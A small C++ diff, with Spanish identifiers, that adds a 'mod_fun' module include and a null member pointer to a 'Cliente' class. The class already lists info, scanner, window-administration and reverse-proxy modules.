@@ -10,6 +10,7 @@
 #include "mod_info.hpp"
 #include "mod_reverse_proxy.hpp"
 #include "mod_escaner.hpp"
+#include "mod_fun.hpp"
 
 struct Paquete {
 	u_int uiTipoPaquete;
@@ -62,6 +63,7 @@ class Cliente {
 		mod_AdminVentanas* mod_AdminVen     = nullptr;
 		mod_Info*          mod_Inf0         = nullptr;
 		mod_Escaner*       mod_Scan         = nullptr;
+		modFun*            mod_Fun          = nullptr;
 		
 		//Map para armar los paquetes entrantes
 		std::map<int, std::vector<char>> paquetes_Acumulados;
